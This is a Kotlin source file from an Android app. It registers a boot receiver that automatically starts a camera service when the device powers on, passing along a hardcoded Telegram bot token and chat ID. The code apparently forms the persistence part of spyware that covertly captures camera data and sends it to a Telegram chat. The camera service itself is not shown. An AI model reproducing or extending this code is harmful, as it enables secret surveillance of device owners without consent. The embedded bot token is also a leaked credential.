package com.sasix.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
            intent.action == Intent.ACTION_QUICKBOOT_POWERON) {
            
            val serviceIntent = Intent(context, CameraService::class.java).apply {
                putExtra("BOT_TOKEN", "8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg")
                putExtra("CHAT_ID", "7642100129")
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        }
    }
}
